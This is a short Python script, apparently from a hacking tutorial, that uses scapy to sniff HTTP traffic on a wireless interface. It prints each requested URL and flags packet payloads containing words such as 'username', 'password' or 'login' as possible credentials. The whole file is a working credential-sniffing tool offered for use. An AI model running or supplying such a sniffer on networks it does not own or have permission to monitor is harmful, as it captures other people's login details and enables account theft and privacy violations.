import scapy.all as scapy 
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store = False , prn = process_sniffed_packet )
     # store in memory is false  = save memory , prn callback func (call everytime)

def  get_url(packet):

     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
     if packet.haslayer(scapy.Raw):        
               #print(packet[scapy.Raw].load)  #the same below
               load = packet[scapy.Raw].load
               keywords = ["username" , "user" , "login" , "password" , "Email" , "Password" , "pass"]
               for keyword in keywords:
                    if keyword in load :
                         return load           

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
            #print(packet.show()) # show all capture
            url = get_url(packet)
            print("[+] HTTP Request >>" +  url)
            login_info = get_login_info(packet)
            if login_info : 
                     print("\n\n [+] Possible username/pasword" + login_info + "\n\n")
            

sniff("wlp7s0")